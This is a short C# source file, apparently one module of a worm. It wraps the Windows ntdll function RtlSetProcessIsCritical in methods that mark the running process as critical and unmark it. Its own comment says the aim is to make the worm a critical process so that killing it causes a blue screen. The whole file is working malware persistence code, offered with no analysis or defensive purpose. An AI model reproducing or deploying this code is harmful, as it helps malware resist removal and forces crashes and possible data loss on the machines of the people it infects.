using System;
using System.Runtime.InteropServices;

public static class CriticalProcess
{
    //makes the worm critical process when killed it gives a bsod
    private const uint STATUS_SUCCESS = 0;

   
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint RtlSetProcessIsCritical(
        bool bIsCritical,
        bool bNeedScb,
        bool bReserved);

    public static bool MakeCritical()
    {
        try
        {
            uint ret = RtlSetProcessIsCritical(true, false, false);
            return ret == STATUS_SUCCESS;
        }
        catch
        {
            return false;
        }
    }

    public static bool RemoveCritical()
    {
        try
        {
            uint ret = RtlSetProcessIsCritical(false, false, false);
            return ret == STATUS_SUCCESS;
        }
        catch
        {
            return false;
        }
    }
}
